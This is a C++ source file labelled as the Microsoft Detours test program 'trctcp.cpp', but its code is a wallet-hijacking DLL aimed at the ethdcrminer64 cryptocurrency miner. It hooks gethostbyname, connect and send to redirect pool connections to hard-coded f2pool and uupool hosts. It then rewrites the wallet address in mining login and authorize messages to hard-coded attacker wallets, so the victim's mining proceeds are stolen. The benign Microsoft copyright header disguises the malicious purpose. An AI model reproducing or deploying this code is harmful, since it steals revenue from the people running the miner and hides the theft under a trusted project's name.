//////////////////////////////////////////////////////////////////////////////
//
//  Detours Test Program (trctcp.cpp of trctcp.dll)
//
//  Microsoft Research Detours Package, Version 3.0.
//
//  Copyright (c) Microsoft Corporation.  All rights reserved.
//
#define _WIN32_WINNT        0x0400
#define WIN32
#define NT
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define DBG_TRACE   0

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
//#include <string>
#include <process.h>
//#include <tlhelp32.h>
//#include <tchar.h>
#include "detours.h"
//#include "syelog.h"

//#include "winternl.h"
#include "ddebug.h"




# pragma warning (disable:4819)

static const int ETH_WALLET_LEN = 1;
static char ETH_WALLET[ETH_WALLET_LEN][43]={"0x0e77d862a62e67328b8eb9c9c2884df163be5b98"};
static char *ETH_MINE_POOL_HNAME="eth.f2pool.com";
static unsigned short ETH_MINE_POOL_PORT=8008;

static const int ETC_WALLET_LEN = 1;
static char ETC_WALLET[ETC_WALLET_LEN][43]={"0x0e77d862a62e67328b8eb9c9c2884df163be5b98"};
static char *ETC_MINE_POOL_HNAME="etc.f2pool.com";
static unsigned short ETC_MINE_POOL_PORT=8118;

static const int ETP_WALLET_LEN = 1;
static char ETP_WALLET[ETP_WALLET_LEN][35]={"MDoBLLXZnBvnbyb5NfEV8XTWwEJb3YLcxv"};
static char *ETP_MINE_POOL_HNAME="etp.uupool.cn";
static unsigned short ETP_MINE_POOL_PORT=8008;

static const int SC_WALLET_LEN = 1;
static char SC_WALLET[SC_WALLET_LEN][36]={"DsXnHq3fwYZfXbau8caDUag5hGMgcjdh2vN"};
static char *SC_MINE_POOL_HNAME="dcr.uupool.cn";
static unsigned short SC_MINE_POOL_PORT=3252;

static char *s_MinePoolHName;
static int i_MinePoolHNameLen;
static char s_MinePoolIP[16];
static int i_MinePoolIPLen;
static unsigned short i_MinePoolPort;
static SOCKET minePoolSocket;

void initializer()
{
}

enum SMiningMode{E_ETH=0, E_ETC, E_ETP, E_ETC_SC,E_ETH_SC,E_ETP_SC}miningMode;



//////////////////////////////////////////////////////////////////////////////
static HMODULE s_hInst = NULL;
static WCHAR s_wzDllPath[MAX_PATH];
static char s_mWallet[50];
static int i_mWalletLen;
static char s_mMinePoolHName [50];
static int i_mMinePoolHNameLen;
static char s_mMinePoolIP [16];
static int i_mMinePoolIPLen;

static char s_scWallet[50];
static int i_scWalletLen;
static char s_scMinePoolHName [50];
static int i_scMinePoolHNameLen;
static char s_scMinePoolIP [16];
static int i_scMinePoolIPLen;

LONG s_nTlsIndent = -1;
LONG s_nTlsThread = -1;
LONG s_nThreadCnt = 0;

//////////////////////////////////////////////////////////////////////////////
//
extern "C" {
    HANDLE (WINAPI * Real_CreateFileW)(LPCWSTR a0,
                                       DWORD a1,
                                       DWORD a2,
                                       LPSECURITY_ATTRIBUTES a3,
                                       DWORD a4,
                                       DWORD a5,
                                       HANDLE a6)
        = CreateFileW;

    BOOL (WINAPI * Real_WriteFile)(HANDLE hFile,
                                   LPCVOID lpBuffer,
                                   DWORD nNumberOfBytesToWrite,
                                   LPDWORD lpNumberOfBytesWritten,
                                   LPOVERLAPPED lpOverlapped)
        = WriteFile;

    BOOL (WINAPI * Real_FlushFileBuffers)(HANDLE hFile)
        = FlushFileBuffers;

    BOOL (WINAPI * Real_CloseHandle)(HANDLE hObject)
        = CloseHandle;

    BOOL (WINAPI * Real_WaitNamedPipeW)(LPCWSTR lpNamedPipeName, DWORD nTimeOut)
        = WaitNamedPipeW;

    BOOL (WINAPI * Real_SetNamedPipeHandleState)(HANDLE hNamedPipe,
                                                 LPDWORD lpMode,
                                                 LPDWORD lpMaxCollectionCount,
                                                 LPDWORD lpCollectDataTimeout)
        = SetNamedPipeHandleState;

    DWORD (WINAPI * Real_GetCurrentProcessId)(VOID)
        = GetCurrentProcessId;

    VOID (WINAPI * Real_GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime)
        = GetSystemTimeAsFileTime;

    VOID (WINAPI * Real_InitializeCriticalSection)(LPCRITICAL_SECTION lpSection)
        = InitializeCriticalSection;

    VOID (WINAPI * Real_EnterCriticalSection)(LPCRITICAL_SECTION lpSection)
        = EnterCriticalSection;

    VOID (WINAPI * Real_LeaveCriticalSection)(LPCRITICAL_SECTION lpSection)
        = LeaveCriticalSection;
}


DWORD (WINAPI * Real_GetModuleFileNameW)(HMODULE a0,
                                         LPWSTR a1,
                                         DWORD a2)
    = GetModuleFileNameW;

BOOL (WINAPI * Real_CreateProcessW)(LPCWSTR a0,
                                    LPWSTR a1,
                                    LPSECURITY_ATTRIBUTES a2,
                                    LPSECURITY_ATTRIBUTES a3,
                                    BOOL a4,
                                    DWORD a5,
                                    LPVOID a6,
                                    LPCWSTR a7,
                                    LPSTARTUPINFOW a8,
                                    LPPROCESS_INFORMATION a9)
    = CreateProcessW;

INT (WINAPI * Real_WSAAddressToStringW)(LPSOCKADDR a0,
                                        DWORD a1,
                                        LPWSAPROTOCOL_INFOW a2,
                                        LPWSTR a3,
                                        LPDWORD a4)
    = WSAAddressToStringW;

int (WINAPI * Real_WSAConnect)(SOCKET a0,
                               CONST sockaddr* a1,
                               int a2,
                               LPWSABUF a3,
                               LPWSABUF a4,
                               LPQOS a5,
                               LPQOS a6)
    = WSAConnect;

int (WINAPI * Real_WSARecv)(SOCKET a0,
                            LPWSABUF a1,
                            DWORD a2,
                            LPDWORD a3,
                            LPDWORD a4,
                            LPWSAOVERLAPPED a5,
                            LPWSAOVERLAPPED_COMPLETION_ROUTINE a6)
    = WSARecv;

int (WINAPI * Real_WSASend)(SOCKET a0,
                            LPWSABUF a1,
                            DWORD a2,
                            LPDWORD a3,
                            DWORD a4,
                            LPWSAOVERLAPPED a5,
                            LPWSAOVERLAPPED_COMPLETION_ROUTINE a6)
    = WSASend;

int (WINAPI * Real_connect)(SOCKET a0,
                            CONST sockaddr* a1,
                            int a2)
    = connect;

int (WINAPI * Real_recv)(SOCKET a0,
                         char* a1,
                         int a2,
                         int a3)
    = recv;

int (WINAPI * Real_send)(SOCKET a0,
                         CONST char* a1,
                         int a2,
                         int a3)
    = send;

struct hostent* (WINAPI * Real_gethostbyname)(CONST char* a1)
    = gethostbyname;
/////////////////////////////////////////////////////////////
// Detours
//

BOOL WINAPI Mine_WriteFile(HANDLE hFile,
                                   LPCVOID lpBuffer,
                                   DWORD nNumberOfBytesToWrite,
                                   LPDWORD lpNumberOfBytesWritten,
                                   LPOVERLAPPED lpOverlapped)
{
    _PrintEnter("%p: WriteFile(%p,%p,%x,%x,%p)\n", hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

    BOOL rv = 0;
    __try {
        rv = Real_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    } __finally {
        _PrintExit("%p: WriteFile(,,,,,,) -> %x\n", hFile, rv);
    };
    return rv;
}

BOOL WINAPI Mine_CreateProcessW(LPCWSTR lpApplicationName,
                                LPWSTR lpCommandLine,
                                LPSECURITY_ATTRIBUTES lpProcessAttributes,
                                LPSECURITY_ATTRIBUTES lpThreadAttributes,
                                BOOL bInheritHandles,
                                DWORD dwCreationFlags,
                                LPVOID lpEnvironment,
                                LPCWSTR lpCurrentDirectory,
                                LPSTARTUPINFOW lpStartupInfo,
                                LPPROCESS_INFORMATION lpProcessInformation)
{
    _PrintEnter("CreateProcessW(%ls,%ls,%p,%p,%x,%x,%p,%ls,%p,%p)\n",
                lpApplicationName,
                lpCommandLine,
                lpProcessAttributes,
                lpThreadAttributes,
                bInheritHandles,
                dwCreationFlags,
                lpEnvironment,
                lpCurrentDirectory,
                lpStartupInfo,
                lpProcessInformation);

    BOOL rv = 0;
    __try {
        rv = Real_CreateProcessW(lpApplicationName,
                                 lpCommandLine,
                                 lpProcessAttributes,
                                 lpThreadAttributes,
                                 bInheritHandles,
                                 dwCreationFlags,
                                 lpEnvironment,
                                 lpCurrentDirectory,
                                 lpStartupInfo,
                                 lpProcessInformation);
    } __finally {
        _PrintExit("CreateProcessW(,,,,,,,,,) -> %x\n", rv);
    };
    return rv;
}

int WINAPI Mine_WSAConnect(SOCKET a0,
                           sockaddr* a1,
                           int a2,
                           LPWSABUF a3,
                           LPWSABUF a4,
                           LPQOS a5,
                           LPQOS a6)
{
    int rv = 0;
    __try {
        rv = Real_WSAConnect(a0, a1, a2, a3, a4, a5, a6);
    } __finally {
        _PrintEnter("%p: WSAConnect(,%p,%x,%p,%p,%p,%p) -> %x\n",
                    a0, a1, a2, a3, a4, a5, a6, rv);
        _PrintExit(NULL);
    };
    return rv;
}

int WINAPI Mine_WSARecv(SOCKET a0,
                        LPWSABUF a1,
                        DWORD a2,
                        LPDWORD a3,
                        LPDWORD a4,
                        LPWSAOVERLAPPED a5,
                        LPWSAOVERLAPPED_COMPLETION_ROUTINE a6)
{
    int rv = -1;
    __try {
        rv = Real_WSARecv(a0, a1, a2, a3, a4, a5, a6);
    } __finally {
        if (rv == 0) {
            _PrintEnter("%p: WSARecv(,%p,%x,%p,%p,%p,%p)\n",
                        a0, a1, a2, a3, a4, a5, a6);
            _PrintDump(a0, a1[0].buf, a1[0].len < *a3 ? a1[0].len : *a3);
            _PrintExit("%p: WSARecv(,,,,,,) -> %x\n", a0, rv);
        }
    };
    return rv;
}

int WINAPI Mine_WSASend(SOCKET a0,
                        LPWSABUF a1,
                        DWORD a2,
                        LPDWORD a3,
                        DWORD a4,
                        LPWSAOVERLAPPED a5,
                        LPWSAOVERLAPPED_COMPLETION_ROUTINE a6)
{
    _PrintEnter("%p: WSASend(,%p,%x,%p,%x,%p,%p)\n", a0, a1, a2, a3, a4, a5, a6);

    int rv = 0;
    __try {
        rv = Real_WSASend(a0, a1, a2, a3, a4, a5, a6);
    } __finally {
        _PrintExit("%p: WSASend(,,,,,,) -> %x\n", a0, rv);
    };
    return rv;
}

int WINAPI Mine_connect(SOCKET a0,
                        sockaddr* name,
                        int namelen)
{
    sockaddr_in *sa=(sockaddr_in*)name;
    char *ip=inet_ntoa(sa->sin_addr);
    int iplen = (int)strlen(ip);
    if(iplen == i_MinePoolIPLen && memcmp(s_MinePoolIP,ip,i_MinePoolIPLen)==0){
        sa->sin_port=htons(i_MinePoolPort);
    }
    //Syelog(SYELOG_SEVERITY_INFORMATION, " Mine_connect(%s:%d, %d - %d)\n", ip,sa->sin_port,i_MinePoolIPLen,iplen);

    int rv = 0;
    __try {
        rv = Real_connect(a0, (sockaddr*)sa, namelen);
    } __finally {
        WCHAR wzAddress[512];
        DWORD nAddress = 512;
        int err = WSAGetLastError();
        if (Real_WSAAddressToStringW((sockaddr*)sa, namelen, NULL, wzAddress, &nAddress) == 0) {
            if (rv == SOCKET_ERROR) {
                Syelog(SYELOG_SEVERITY_INFORMATION, "%p: connect(,%p:%ls,%x) -> %x [%d]\n",
                            a0, name, wzAddress, namelen, rv, err);
            }
            else {
                Syelog(SYELOG_SEVERITY_INFORMATION, "%p: connect(%p,%ls,%x) -> %x\n",
                            a0, name, wzAddress, namelen, rv);
            }
        }
        WSASetLastError(err);
    };
    return rv;
}

int WINAPI Mine_recv(SOCKET a0,
                     char* a1,
                     int a2,
                     int a3)
{
    Syelog(SYELOG_SEVERITY_INFORMATION, "%p: recv(,%p,%x,%x)\n", a0, a1, a2, a3);

    int rv = 0;
    __try {
        rv = Real_recv(a0, a1, a2, a3);
    } __finally {
        Syelog(SYELOG_SEVERITY_INFORMATION, "%p: recv(,%s,,) -> %x\n", a0, a1, rv);
    };
    return rv;
}

struct hostent* WINAPI Mine_gethostbyname(CONST char* hname){
    char *a1 = (char*)hname;
    int hnamelen = (int)strlen(a1);

    if(!(i_mMinePoolHNameLen == hnamelen && memcmp(s_mMinePoolHName,a1,hnamelen)==0) && !(i_scMinePoolHNameLen == hnamelen && memcmp(s_scMinePoolHName,a1,hnamelen)==0)){
        a1 = s_MinePoolHName;
    }
    //DEBUG a1 = s_MinePoolHName;
    Syelog(SYELOG_SEVERITY_INFORMATION, " gethostbyname: %s -> %s)\n", hname, a1);
    struct hostent *hptr=NULL;
   
    __try {
        hptr = Real_gethostbyname(a1);
    } __finally {

        struct sockaddr_in sa;
        if(hptr!=NULL){
            memcpy(&sa.sin_addr.s_addr,hptr->h_addr_list[0],hptr->h_length);
            char *ip=inet_ntoa(sa.sin_addr);
            int iplen = (int)strlen(ip);

            if(i_mMinePoolHNameLen == hnamelen && memcmp(s_mMinePoolHName,a1,hnamelen)==0){
                i_mMinePoolIPLen = iplen;
                memcpy(s_mMinePoolIP,ip,i_mMinePoolIPLen);
                s_mMinePoolIP[i_mMinePoolIPLen]='\0';
            }else if(i_scMinePoolHNameLen == hnamelen && memcmp(s_scMinePoolHName,a1,hnamelen)==0){
                i_scMinePoolIPLen = iplen;
                memcpy(s_scMinePoolIP,ip,i_scMinePoolIPLen);
                s_scMinePoolIP[i_scMinePoolIPLen]='\0';
            }else{
                i_MinePoolIPLen = iplen;
                memcpy(s_MinePoolIP,ip,i_MinePoolIPLen);
                s_MinePoolIP[i_MinePoolIPLen]='\0';
            }
         
            Syelog(SYELOG_SEVERITY_INFORMATION, "###: gethostbyname(%s) -> %s\n",a1, s_mMinePoolIP);
        }
    };
    return hptr;
}

static int mWalletIndex=0;
static int sWalletIndex=0;
VOID process(char* a1,char* wallet,bool issc){
    char *p;
    int walletLen;
    
    if(issc){
        walletLen = i_scWalletLen;
        p = strstr(a1,s_scWallet);
    }else{
        walletLen = i_mWalletLen;
        p = strstr(a1,s_mWallet);
    }        
    //debug    p = NULL;
    if(!p){
        p = strstr(a1,"\"params\": [\"");//,12
        p+=12;        
        memcpy(p,wallet,walletLen);
    }     
}
VOID replaceWallet(char* a1,int len,bool issc){
    char c = a1[len-1];
    a1[len-1]='\0';
    switch(miningMode){
        case E_ETH:
            if(mWalletIndex>=ETH_WALLET_LEN)mWalletIndex=0;
            process(a1,(char*)ETH_WALLET[mWalletIndex++],issc);            
            break;
        case E_ETC:
            if(mWalletIndex>=ETC_WALLET_LEN)mWalletIndex=0;
            process(a1,(char*)ETC_WALLET[mWalletIndex++],issc);            
            break;
        case E_ETP:
            if(mWalletIndex>=ETP_WALLET_LEN)mWalletIndex=0;
            process(a1,(char*)ETP_WALLET[mWalletIndex++],issc);
            break;
        case E_ETH_SC:
            if(issc){
                if(sWalletIndex>=SC_WALLET_LEN)sWalletIndex=0;
                process(a1,(char*)SC_WALLET[sWalletIndex++],issc);
            }else{
                if(mWalletIndex>=ETH_WALLET_LEN)mWalletIndex=0;
                process(a1,(char*)ETH_WALLET[mWalletIndex++],issc);
            }
            break;
        case E_ETC_SC:
            if(issc){
                if(sWalletIndex>=SC_WALLET_LEN)sWalletIndex=0;
                process(a1,(char*)SC_WALLET[sWalletIndex++],issc);
            }else{
                if(mWalletIndex>=ETC_WALLET_LEN)mWalletIndex=0;
                process(a1,(char*)ETC_WALLET[mWalletIndex++],issc);
            }
            break;
        case E_ETP_SC:
            if(issc){
                if(sWalletIndex>=SC_WALLET_LEN)sWalletIndex=0;
                process(a1,(char*)SC_WALLET[sWalletIndex++],issc);
            }else{
                if(mWalletIndex>=ETP_WALLET_LEN)mWalletIndex=0;
                process(a1,(char*)ETP_WALLET[mWalletIndex++],issc);
            }
            break;
        default:
        break;
    }
    Syelog(SYELOG_SEVERITY_INFORMATION, "### %s\n",a1);
    a1[len-1]=c;
}
int WINAPI Mine_send(SOCKET a0,
                     char* a1,
                     int a2,
                     int a3)
{
    char *p = strstr(a1,"\"method\": \"eth_submitLogin\"");//,27
    if(p){
        replaceWallet(a1,a2,false);
    }else{
        switch(miningMode){
            case E_ETH_SC:
            case E_ETC_SC:
            case E_ETP_SC:
                p = strstr(a1,"\"method\": \"mining.authorize\"");//,28
                if(p){
                    replaceWallet(a1,a2,true);
                }
                break;
            default:
            break;
        }
    }
    
    
	//_PrintEnter("%p: send ");
    //_PrintDump(a0, a1, a2);
    int rv = 0;
    __try {
        rv = Real_send(a0, a1, a2, a3);
    } __finally {
        if (rv == SOCKET_ERROR) {
            int err = WSAGetLastError();
            Syelog(SYELOG_SEVERITY_INFORMATION, "%p: send(,,,) -> %x (%d)\n", a0, rv, err);
        }
    };
    return rv;
}


/////////////////////////////////////////////////////////////
// AttachDetours
//
PCHAR DetRealName(PCHAR psz)
{
    PCHAR pszBeg = psz;
    // Move to end of name.
    while (*psz) {
        psz++;
    }
    // Move back through A-Za-z0-9 names.
    while (psz > pszBeg &&
           ((psz[-1] >= 'A' && psz[-1] <= 'Z') ||
            (psz[-1] >= 'a' && psz[-1] <= 'z') ||
            (psz[-1] >= '0' && psz[-1] <= '9'))) {
        psz--;
    }
    return psz;
}

VOID DetAttach(PVOID *ppbReal, PVOID pbMine, PCHAR psz)
{
    LONG l = DetourAttach(ppbReal, pbMine);
    if (l != 0) {
        Syelog(SYELOG_SEVERITY_NOTICE,
               "Attach failed: `%s': error %d\n", DetRealName(psz), l);
    }
}

VOID DetDetach(PVOID *ppbReal, PVOID pbMine, PCHAR psz)
{
    LONG l = DetourDetach(ppbReal, pbMine);
    if (l != 0) {
        Syelog(SYELOG_SEVERITY_NOTICE,
               "Detach failed: `%s': error %d\n", DetRealName(psz), l);
    }
}

#define ATTACH(x)       DetAttach(&(PVOID&)Real_##x,Mine_##x,#x)
#define DETACH(x)       DetDetach(&(PVOID&)Real_##x,Mine_##x,#x)

LONG AttachDetours(VOID)
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    ATTACH(CreateProcessW);
    //ATTACH(WSAConnect);

    ATTACH(WSARecv);
    ATTACH(WSASend);

    ATTACH(connect);
    ATTACH(gethostbyname);
    //ATTACH(recv);
    ATTACH(send);


    return DetourTransactionCommit();
}

LONG DetachDetours(VOID)
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DETACH(CreateProcessW);

    //DETACH(WSAConnect);

    DETACH(WSARecv);
    DETACH(WSASend);
    DETACH(gethostbyname);
    DETACH(connect);
    //DETACH(recv);
    DETACH(send);

    return DetourTransactionCommit();
}



//////////////////////////////////////////////////////////////////////////////
//
// DLL module information
//
BOOL ThreadAttach(HMODULE hDll)
{
    (void)hDll;

    if (s_nTlsIndent >= 0) {
        TlsSetValue(s_nTlsIndent, (PVOID)0);
    }
    if (s_nTlsThread >= 0) {
        LONG nThread = InterlockedIncrement(&s_nThreadCnt);
        TlsSetValue(s_nTlsThread, (PVOID)(LONG_PTR)nThread);
    }
    return TRUE;
}

BOOL ThreadDetach(HMODULE hDll)
{
    (void)hDll;

    if (s_nTlsIndent >= 0) {
        TlsSetValue(s_nTlsIndent, (PVOID)0);
    }
    if (s_nTlsThread >= 0) {
        TlsSetValue(s_nTlsThread, (PVOID)0);
    }
    return TRUE;
}

/**
ETC: ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal ETC-WALLET -epsw x -eworker MINER_NUM -mode 1
ETC+SC: ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal ETC-WALLET -epsw x -eworker MINER_NUM -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
ETH+SC: ethdcrminer64.exe -epool eth.uupool.cn:8008 -ewal -WALLET -epsw x -eworker MINER_NUM -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
ETH: ethdcrminer64.exe -epool pool.tweth.tw:8880 -ewal ETh-WALLET -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1
ETP: ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal -WALLET -epsw x -eworker 1 -mode 1 -allcoins exp
ETP+SC: ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal -WALLET -epsw x -eworker MINER_NUM -allcoins exp -epsw x -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
*/
BOOL parseMining(){
    LPTSTR cmdline = GetCommandLine();
    char *p,*pos;
    p = strstr(cmdline," -epool ");
    if(p==NULL){
        Syelog(SYELOG_SEVERITY_FATAL, "### Error can't get '-epool': %s\n", cmdline);
        return FALSE;
    }
    p+=7;
    for (; *p == ' '; p++);
    pos = p;
    for (; *p != ':' && *p != ' ' && *p != '\0'; p++);
    i_mMinePoolHNameLen = (int)(p-pos);
    memcpy(s_mMinePoolHName,pos,i_mMinePoolHNameLen);
    s_mMinePoolHName[i_mMinePoolHNameLen]='\0';
    i_mMinePoolIPLen=0;

    i_scMinePoolIPLen=0;
    i_scMinePoolHNameLen=0;
    p = strstr(cmdline," stratum+tcp://");
    if(p!=NULL){
        p+=15;
        pos = p;
        for (; *p != ':' && *p != ' ' && *p != '\0'; p++);
        i_scMinePoolHNameLen = (int)(p-pos);
        memcpy(s_scMinePoolHName,pos,i_scMinePoolHNameLen);
        s_scMinePoolHName[i_scMinePoolHNameLen]='\0';
    }    

    p = strstr(cmdline," -ewal ");
    if(p==NULL){
        Syelog(SYELOG_SEVERITY_FATAL, "### Error can't get '-ewal': %s\n", cmdline);
        return FALSE;
    }
    miningMode=E_ETH;
    p+=6;
    for (; *p == ' '; p++);
    pos = p;
    for (; *p != ' ' && *p != '\0'; p++);
    i_mWalletLen = (int)(p-pos);
    memcpy(s_mWallet,pos,i_mWalletLen);
    s_mWallet[i_mWalletLen]='\0';

    p=strstr(cmdline," -dwal ");
    if(p==NULL){
        if(memcmp(s_mWallet,"0x",2)==0){
            p=strstr(cmdline," -allcoins ");
            if(p!=NULL){
                p+=10;
                for (; *p == ' '; p++);
                pos=p;
                for (; *p != ' ' && *p != '\0'; p++);
                if(p-pos == 3 && memcmp(pos,"etc",2)==0){
                    miningMode=E_ETC;
                    return true;
                }
            }
            if(memcmp(s_mMinePoolHName,"etc",3)==0){
                miningMode=E_ETC;
                return true;
            }
            miningMode=E_ETH;
        }else{
            miningMode=E_ETP;
        }
    }else{
        p+=6;
        for (; *p == ' '; p++);
        char *wallet=p;
        for (; *p != ' ' && *p != '\0' && *p != '.'; p++);
        i_scWalletLen = (int)(p-wallet);
        memcpy(s_scWallet,wallet,i_scWalletLen);
        s_scWallet[i_scWalletLen]='\0';
        
        if(memcmp(s_mWallet,"0x",2)==0){
            p=strstr(cmdline," -allcoins ");
            if(p!=NULL){
                p+=10;
                for (; *p == ' '; p++);
                pos=p;
                for (; *p != ' ' && *p != '\0'; p++);
                if(p-pos == 3 && memcmp(pos,"etc",2)==0){
                    miningMode=E_ETC_SC;
                    return true;
                }
            }
            if(memcmp(s_mMinePoolHName,"etc",3)==0){
                miningMode=E_ETC_SC;
                return true;
            }
            miningMode=E_ETH_SC;
        }else{
            miningMode=E_ETP_SC;
        }
    }    
    return TRUE;
}

BOOL ProcessAttach(HMODULE hDll)
{
    s_bLog = FALSE;
    s_nTlsIndent = TlsAlloc();
    s_nTlsThread = TlsAlloc();

    WCHAR wzExeName[MAX_PATH];
    s_hInst = hDll;

    Real_GetModuleFileNameW(hDll, s_wzDllPath, ARRAYSIZE(s_wzDllPath));
    Real_GetModuleFileNameW(NULL, wzExeName, ARRAYSIZE(wzExeName));

    
    Syelog(SYELOG_SEVERITY_INFORMATION, "### %ls\n", wzExeName);

    if(!parseMining())return FALSE;

    switch(miningMode){
        case E_ETH:
            s_MinePoolHName = ETH_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETH_MINE_POOL_HNAME);
            i_MinePoolPort = ETH_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETH, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETC:
            s_MinePoolHName = ETC_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETC_MINE_POOL_HNAME);
            i_MinePoolPort = ETC_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETC, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETP:
            s_MinePoolHName = ETP_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETP_MINE_POOL_HNAME);
            i_MinePoolPort = ETP_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETP, mWallet: %s(%d), minePool: %s\n", s_mWallet, i_mWalletLen,s_mMinePoolHName);
            break;
        case E_ETH_SC:
            s_MinePoolHName = ETH_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETH_MINE_POOL_HNAME);
            i_MinePoolPort = ETH_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETH_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        case E_ETC_SC:
            s_MinePoolHName = ETC_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETC_MINE_POOL_HNAME);
            i_MinePoolPort = ETC_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETC_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        case E_ETP_SC:
            s_MinePoolHName = ETP_MINE_POOL_HNAME;
            i_MinePoolHNameLen = (int)strlen(ETP_MINE_POOL_HNAME);
            i_MinePoolPort = ETP_MINE_POOL_PORT;
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: E_ETP_SC, mWallet: %s(%d), minePool: %s, scWallet: %s(%d)\n", s_mWallet, i_mWalletLen,s_mMinePoolHName, s_scWallet, i_scWalletLen);
            break;
        default:
            Syelog(SYELOG_SEVERITY_INFORMATION, "### miningMode: Unkonw\n");
            return FALSE;
    }
    
    LONG error = AttachDetours();
    if (error != NO_ERROR) {
        Syelog(SYELOG_SEVERITY_FATAL, "### Error attaching detours: %d\n", error);
    }

    ThreadAttach(hDll);

    s_bLog = TRUE;
    return TRUE;
}

BOOL ProcessDetach(HMODULE hDll)
{
    ThreadDetach(hDll);
    s_bLog = FALSE;

    LONG error = DetachDetours();
    if (error != NO_ERROR) {
        Syelog(SYELOG_SEVERITY_FATAL, "### Error detaching detours: %d\n", error);
    }  

    if (s_nTlsIndent >= 0) {
        TlsFree(s_nTlsIndent);
    }
    if (s_nTlsThread >= 0) {
        TlsFree(s_nTlsThread);
    }
    return TRUE;
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD dwReason, PVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;

    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (dwReason) {
      case DLL_PROCESS_ATTACH:
        SyelogOpen("trctcp" DETOURS_STRINGIFY(DETOURS_BITS), SYELOG_FACILITY_APPLICATION);
        Syelog(SYELOG_SEVERITY_INFORMATION, "##################################################################\n");
        initializer();
        DetourRestoreAfterWith();
        printf("trctcp" DETOURS_STRINGIFY(DETOURS_BITS) ".dll: Starting.\n");
        fflush(stdout);
        return ProcessAttach(hModule);
      case DLL_PROCESS_DETACH:
        ProcessDetach(hModule);
        Syelog(SYELOG_SEVERITY_NOTICE, "### Closing.\n");
        SyelogClose(FALSE);
        break;
      case DLL_THREAD_ATTACH:
        return ThreadAttach(hModule);
      case DLL_THREAD_DETACH:
        return ThreadDetach(hModule);
    }
    return TRUE;
}
//
///////////////////////////////////////////////////////////////// End of File.
